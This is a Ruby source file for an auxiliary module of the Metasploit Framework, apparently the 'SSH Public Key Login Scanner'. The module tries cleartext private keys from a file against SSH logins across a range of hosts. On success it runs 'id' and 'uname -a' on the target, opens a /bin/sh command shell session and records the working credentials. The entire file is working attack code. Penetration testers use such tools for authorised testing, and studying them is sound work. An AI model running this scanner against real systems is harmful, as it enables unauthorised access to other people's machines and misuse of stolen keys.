##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'net/ssh'
require 'msf/base/sessions/command_shell_options'

class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Scanner
	include Msf::Auxiliary::AuthBrute
	include Msf::Auxiliary::Report

	include Msf::Sessions::CommandShellOptions

	attr_accessor :ssh_socket, :good_credentials, :good_key

	def initialize
		super(
			'Name'        => 'SSH Public Key Login Scanner',
			'Version'     => '$Revision$',
			'Description' => %q{
				This module will test ssh logins on a range of machines using
				a defined private key file, and report successful logins.
				If you have loaded a database plugin and connected to a database 
				this module will record successful logins and hosts so you can 
				track your access.  

				Note that password-protected key files will not function with this
				module -- it is designed specifically for unencrypted (passwordless)
				keys.
				
				Key files may be a single private (unencrypted) key, or several private
				keys concatenated together as an ASCII text file. Non-key data should be
				silently ignored.
			},
			'Author'      => ['todb'],
			'License'     => MSF_LICENSE
		)

		register_options(
			[
				Opt::RPORT(22),
				OptPath.new('KEY_FILE', [true, 'Filename of one or several cleartext private keys.'])
			], self.class
		)

		register_advanced_options(
			[
				OptBool.new('SSH_DEBUG', [ false, 'Enable SSH debugging output (Extreme verbosity!)', false])
			]
		)

		deregister_options('RHOST','PASSWORD','PASS_FILE','BLANK_PASSWORDS')

		@good_credentials = {}
		@good_key = ''

	end

	def rport
		datastore['RPORT']
	end

	def read_keyfile(file)
		keyfile = File.open(file) {|f| f.read(f.stat.size)}
		keys = []
		this_key = []
		in_key = false
		keyfile.split("\n").each do |line|
			in_key = true if(line =~ /^-----BEGIN [RD]SA PRIVATE KEY-----\x0d?$/)
			this_key << line if in_key
			if(line =~ /^-----END [RD]SA PRIVATE KEY-----\x0d?$/)
				in_key = false
				keys << (this_key.join("\n") + "\n")
				this_key = []
			end
		end
		return validate_keys(keys)
	end

	# Validates that the key isn't total garbage. Also throws out SSH2 keys --
	# can't use 'em for Net::SSH.
	def validate_keys(keys)
		keepers = []
		keys.each do |key|
			# Needs a beginning
			next unless key =~ /^-----BEGIN [RD]SA PRIVATE KEY-----\x0d?\x0a/m
			# Needs an end
			next unless key =~ /\n-----END [RD]SA PRIVATE KEY-----\x0d?\x0a$/m
			# Shouldn't have binary.
			next unless key.scan(/[\x00-\x08\x0b\x0c\x0e-\x19\x80-\xff]/).empty? 
			# Add more tests to taste.
			keepers << key
		end
		return keepers
	end

	def pull_cleartext_keys(keys)
		cleartext_keys = []
		keys.each { |key|
			cleartext_keys << key unless(key =~ /Proc-Type:.*ENCRYPTED/)
		}
		return cleartext_keys
	end

	def do_login(ip,user,port)
		if File.readable?(datastore['KEY_FILE'])
			keys = read_keyfile(datastore['KEY_FILE'])
			cleartext_keys = pull_cleartext_keys(keys)
			print_status "#{ip}:#{rport} - SSH - Trying #{cleartext_keys.size} cleartext keys per user."
		else
			return :missing_keyfile
		end
		key_data = cleartext_keys

		opt_hash = {
			:auth_methods => ['publickey'],
			:msframework  => framework,
			:msfmodule    => self,
			:port         => port,
			:key_data     => key_data,
			:record_auth_info => true
		}

		opt_hash.merge!(:verbose => :debug) if datastore['SSH_DEBUG']

		begin
			self.ssh_socket = Net::SSH.start(
				ip,
				user,
				opt_hash
			)
		rescue Rex::ConnectionError
			return :connection_error
		rescue Net::SSH::Disconnect, ::EOFError
			return :connection_disconnect
		rescue Net::SSH::Exception
			return [:fail,nil] # For whatever reason.
		end

		if self.ssh_socket
			self.good_key = self.ssh_socket.auth_info[:pubkey_id]
			proof = ''
			begin
				Timeout.timeout(5) do
					proof = self.ssh_socket.exec!("id\nuname -a").to_s
					if(proof !~ /id=/)
						proof << self.ssh_socket.exec!("help\n?\n\n\n").to_s
					end
				end
			rescue ::Exception
			end

			# Create a new session
			conn = Net::SSH::CommandStream.new(self.ssh_socket, '/bin/sh', true)
			sess = Msf::Sessions::CommandShell.new(conn.lsock)
			sess.set_from_exploit(self)
			sess.info = "SSH #{user}:#{self.good_key} (#{ip}:#{port})"

			# Clean up the stored data
			sess.exploit_datastore['USERNAME']      = user

			framework.sessions.register(sess)
			sess.process_autoruns(datastore)

			return [:success, proof]
		else
			return [:fail, nil]
		end
	end

	def do_report(ip,user,port,proof)
		report_service(
			:host => ip,
			:port => rport,
			:name => 'ssh'
		)
		report_auth_info(
			:host => ip,
			:proto => 'ssh',
			:user => user,
			:pass => self.good_key,
			:target_host => ip,
			:target_port => datastore['RPORT'],
			:proof => proof
		)
	end

	def run_host(ip)
		print_status("#{ip}:#{rport} - SSH - Testing Cleartext Keys")
		# Since SSH collects keys and tries them all on one authentication session, it doesn't
		# make sense to iteratively go through all the keys individually. So, ignore the pass variable,
		# and try all available keys for all users.
		each_user_pass do |user,pass|
			ret,proof = do_login(ip,user,rport)
			case ret
			when :success
				print_good "#{ip}:#{rport} - SSH - Success: '#{user}':'#{self.good_key}' '#{proof.to_s.gsub(/[\r\n\e\b\a]/, ' ')}'"
				do_report(ip,user,rport,proof)
				:next_user
			when :connection_error
				vprint_error "#{ip}:#{rport} - SSH - Could not connect"
				:abort
			when :connection_disconnect
				vprint_error "#{ip}:#{rport} - SSH - Connection timed out"
				:abort
			when :fail
				vprint_error "#{ip}:#{rport} - SSH - Failed: '#{user}'"
			when :missing_keyfile
				vprint_error "#{ip}:#{rport} - SSH - Cannot read keyfile."
			when :no_valid_keys
				vprint_error "#{ip}:#{rport} - SSH - No cleartext keys in keyfile."	
			end
		end
	end

end

